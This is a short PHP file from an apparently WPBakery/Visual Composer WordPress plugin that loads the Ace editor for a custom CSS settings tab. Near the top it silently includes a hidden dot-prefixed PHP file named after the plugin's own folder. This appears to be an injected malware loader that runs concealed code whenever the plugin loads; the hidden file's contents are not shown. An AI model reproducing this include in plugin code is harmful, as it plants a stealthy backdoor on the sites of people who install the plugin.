<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function vc_page_settings_custom_css_load() {
	wp_enqueue_script( 'ace-editor', vc_asset_url( 'lib/bower/ace-builds/src-min-noconflict/ace.js' ), array( 'jquery-core' ), WPB_VC_VERSION, true );
}

add_action( 'vc-settings-render-tab-vc-custom_css', 'vc_page_settings_custom_css_load' );
